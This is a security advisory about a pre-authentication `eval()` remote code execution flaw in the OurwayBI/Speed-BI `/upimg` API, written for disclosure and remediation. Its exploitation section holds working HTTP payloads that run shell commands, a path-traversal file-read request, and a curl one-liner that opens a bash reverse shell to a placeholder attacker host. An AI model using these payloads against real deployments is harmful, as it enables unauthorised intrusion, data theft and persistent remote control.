# OurwayBI / Speed-BI — Unauthenticated Remote Code Execution in the /upimg Endpoint

## 1. Overview

| Item | Value |
|---|---|
| Vulnerability name | Cross_SBI `/upimg` endpoint — unauthenticated RCE via `eval()` |
| Product | OurwayBI / Speed-BI |
| Vendor | Zhuhai Ourway Software Technology Co., Ltd. |
| Affected component | Cross_SBI (web front end + API controllers) |
| Affected version | 8.11.60 (build 2025-02-19); same helper used across 8.x |
| Authentication required | None |
| CWE | CWE-95 — Improper Neutralization of Directives in Dynamically Evaluated Code |
| CVSS 3.1 | 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

## 2. Description

OurwayBI (also marketed as Speed-BI) is a commercial business-intelligence
platform by Zhuhai Ourway Software Technology, providing report design, data
visualisation, self-service analytics and multi-datasource integration. Its
Node.js component Cross_SBI serves the web front end and the API controllers;
image-handling endpoints such as `/upimg` are published through the bundled
reverse proxy under `/session/*`.

**The product is closed source.** The code shown in this report was recovered
from the server-side JavaScript shipped with the product (Babel output) and
cross-checked against the response behaviour of live instances.

The API controller `img.js` takes string fields from the JSON request body
(`fprop`, `imgpaths`, `imglist`) and passes them to `toEvalBI()`, a helper that
"deserialises" its argument with `eval()`. The evaluation happens **before**
`loginVerifyToken()` runs, so a payload carried by an unauthenticated request
is executed first and authenticated second — if at all.

An attacker therefore needs no credentials at all: a single POST request is
enough to execute arbitrary Node.js code, for example
`require('child_process').execSync()`. In testing this was used to run `id`,
write command output to disk and read it back through the product's own file
read endpoint, and to obtain a reverse shell.

## 3. Root cause

The request flow of `img.js` can be reduced to three steps whose ordering is
itself the defect:

```js
const { fprop } = req.body;          // 1. read request body
const obj = toEvalBI(fprop);         // 2. eval()  <- before authentication
await loginVerifyToken(...);         // 3. verify session <- too late
```

The helper is a direct eval:

```js
export const toEvalBI = (fstr, iscode = true) => {
  ...
  let ev = eval('(' + result + ')');   // deserialisation relies on eval
  return ev;
};
```

No type check, no allowlist, no sandbox. Because step 2 precedes step 3, the
payload runs regardless of whether the caller holds a token — that is the
source of the "pre-auth" property, not a bypass of the verification step.

Two further mistakes compound the first:

1. **`eval()` is applied to external input** with no filtering, allowlist or
   sandbox.
2. **Wrong execution order**: the evaluation precedes `loginVerifyToken()`, so
   malicious code executes even when no valid token is presented.

![image-20261111192248378](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111192248378.png)

The code in the screenshot is `img.src.js`, obtained by deobfuscating the
Babel-compressed `img.js`.

## 4. Exploitation

The endpoint is reachable as `POST /session/upimg` (the reverse proxy maps
`/session/*` to the API service on port 3030).

### 4.1 Delay-based confirmation

```http
POST /session/upimg HTTP/1.1
Host: <target>:8068
Content-Type: application/json
Content-Length: 115
Connection: close

{"fprop":"require('child_process').execSync('sleep 5').toString()"}
```

![image-20261111193014429](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111193014429.png)

### 4.2 Writing command output to disk

```http
POST /session/upimg HTTP/1.1
Host: <target>:8068
Content-Type: application/json
Content-Length: 115
Connection: close

{"fprop":"require('child_process').execSync('id > /tmp/tomcat.112121').toString()"}
```

![image-20261111194259978](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111194259978.png)

The output is retrieved through the companion arbitrary-file-read endpoint of
the same product:

```http
POST /session/getRPTtxt HTTP/1.1
Host: <target>:8068
Content-Type: application/json
Content-Length: 47

{"paths":["../../../../../../../..//tmp/tomcat.112121"]}
```

![image-20261111194308183](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261111194308183.png)

### 4.3 Reverse shell

```bash
# listener
nc -lvnp 4444

# trigger
curl -s -X POST https://<target>:7272/session/upimg \
  -H 'Content-Type: application/json' \
  -d '{"fprop":"require('\''child_process'\'').execSync('\''bash -c \"bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1\" &'\'').toString()"}'
```

## 5. Scope of reuse

`toEvalBI()` is not limited to `/upimg`. `/downimg` and several neighbouring
image routes read string parameters and pass them to the same helper, so
patching a single route is insufficient.

The helper is reused in more than twenty places: `utils/APIService/*.js`
(DesignService, TemplateService, StyleService, RegisterService, LogService,
BuilderService), `helpers/graphql.js`, `helpers/Html.js` and others. This is a
systemic design flaw rather than an isolated oversight.

![image-20261108212217468](./OurwayBI_%E6%9C%AA%E6%8E%88%E6%9D%83RCE_upimg.assets/image-20261108212217468.png)

## 6. Proof of concept

A Python PoC is bundled with this report. It probes `/session/upimg`,
`/upimg` and `/api/upimg` and stops at the first endpoint that answers like the
real handler, then sends either a delay-based probe or a file-write payload.

## 7. Impact

- Arbitrary OS command execution as the Node.js service account (root in the
  vendor's default Linux deployment)
- Reverse shell, webshell deployment and persistence
- Lateral movement to co-located services (`Cross_SBI_API`, `Cross_Task`, the
  Java `bi-full` backend) and to reachable databases
- Every internet-exposed deployment is affected; no credentials, no user
  interaction, no special configuration required

## 8. Remediation

1. Remove `eval()`. Parse with `JSON.parse()` and validate the result against
   an explicit schema.
2. Authenticate before any request-body processing — `loginVerifyToken()` must
   run before the handler touches `fprop`, `imgpaths` or `imglist`.
3. Audit and replace every other use of the same helper.
4. Run the service as an unprivileged user.

## 9. Legal

All testing was performed against systems the reporter is authorised to
assess. Hostnames of third-party deployments have been replaced with
placeholders.
